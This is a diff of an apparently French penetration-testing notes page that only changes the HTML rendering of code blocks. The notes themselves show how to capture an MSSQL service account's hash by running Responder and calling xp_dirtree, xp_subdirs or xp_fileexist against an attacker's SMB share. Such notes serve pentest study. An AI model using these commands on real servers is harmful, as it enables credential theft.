@@ -7605,14 +7605,14 @@
 
 <p>Une fois connecté sur un serveur MSSQL il peut être possible d'accéder à un partage SMB via la commande xp_dirtree / xp_subdir / xp_fileexist, ce qui peut possiblement permettre de récupérer le hash de l'utilisateur:</p>
 <p>Sur le poste attaquant:</p>
-<pre><code class="language-bash">sudo responder -I tun0
-</code></pre>
+<div class="language-bash highlight"><pre><span></span><code><span id="__span-0-1"><a id="__codelineno-0-1" name="__codelineno-0-1" href="#__codelineno-0-1"></a>sudo<span class="w"> </span>responder<span class="w"> </span>-I<span class="w"> </span>tun0
+</span></code></pre></div>
 <p>Sur MSSQL:</p>
-<pre><code class="language-sql">xp_dirtree '\\$ip$\fauxpartage'
-exec master.dbo.xp_dirtree '\\$ip$\fauxpartage'
-EXEC master..xp_subdirs '\\$ip$\fauxpartage'
-EXEC master..xp_fileexist '\\$ip$\fauxpartage'
-</code></pre>
+<div class="language-sql highlight"><pre><span></span><code><span id="__span-1-1"><a id="__codelineno-1-1" name="__codelineno-1-1" href="#__codelineno-1-1"></a><span class="n">xp_dirtree</span><span class="w"> </span><span class="s1">&#39;\\$ip$\fauxpartage&#39;</span>
+</span><span id="__span-1-2"><a id="__codelineno-1-2" name="__codelineno-1-2" href="#__codelineno-1-2"></a><span class="k">exec</span><span class="w"> </span><span class="n">master</span><span class="p">.</span><span class="n">dbo</span><span class="p">.</span><span class="n">xp_dirtree</span><span class="w"> </span><span class="s1">&#39;\\$ip$\fauxpartage&#39;</span>
+</span><span id="__span-1-3"><a id="__codelineno-1-3" name="__codelineno-1-3" href="#__codelineno-1-3"></a><span class="k">EXEC</span><span class="w"> </span><span class="n">master</span><span class="p">..</span><span class="n">xp_subdirs</span><span class="w"> </span><span class="s1">&#39;\\$ip$\fauxpartage&#39;</span>
+</span><span id="__span-1-4"><a id="__codelineno-1-4" name="__codelineno-1-4" href="#__codelineno-1-4"></a><span class="k">EXEC</span><span class="w"> </span><span class="n">master</span><span class="p">..</span><span class="n">xp_fileexist</span><span class="w"> </span><span class="s1">&#39;\\$ip$\fauxpartage&#39;</span>
+</span></code></pre></div>
 
 
 
@@ -7659,7 +7659,7 @@ EXEC master..xp_fileexist '\\$ip$\fauxpartage'
     </div>
     
     
-    <script id="__config" type="application/json">{"base": "../../../..", "features": ["navigation.tabs", "navigation.tabs.sticky", "navigation.sections"], "search": "../../../../assets/javascripts/workers/search.b8dbb3d2.min.js", "translations": {"clipboard.copied": "Copied to clipboard", "clipboard.copy": "Copy to clipboard", "search.result.more.one": "1 more on this page", "search.result.more.other": "# more on this page", "search.result.none": "No matching documents", "search.result.one": "1 matching document", "search.result.other": "# matching documents", "search.result.placeholder": "Type to start searching", "search.result.term.missing": "Missing", "select.version": "Select version"}}</script>
+    <script id="__config" type="application/json">{"base": "../../../..", "features": ["navigation.tabs", "navigation.tabs.sticky", "navigation.sections", "content.code.copy"], "search": "../../../../assets/javascripts/workers/search.b8dbb3d2.min.js", "translations": {"clipboard.copied": "Copied to clipboard", "clipboard.copy": "Copy to clipboard", "search.result.more.one": "1 more on this page", "search.result.more.other": "# more on this page", "search.result.none": "No matching documents", "search.result.one": "1 matching document", "search.result.other": "# matching documents", "search.result.placeholder": "Type to start searching", "search.result.term.missing": "Missing", "select.version": "Select version"}}</script>
     
     
       <script src="../../../../assets/javascripts/bundle.fe8b6f2b.min.js"></script>
